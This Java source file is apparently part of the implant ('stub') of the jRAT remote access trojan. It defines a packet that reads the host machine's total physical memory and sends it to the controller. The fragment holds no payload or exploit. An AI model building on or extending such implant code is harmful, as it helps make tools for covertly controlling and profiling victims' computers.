package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;
import java.lang.management.ManagementFactory;

import se.jrat.common.io.StringWriter;

import com.sun.management.OperatingSystemMXBean;


public class Packet13InitTotalMemory extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		long total = ((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize();
				
		dos.writeLong(total);
	}

	@Override
	public byte getPacketId() {
		return (byte) 13;
	}
}
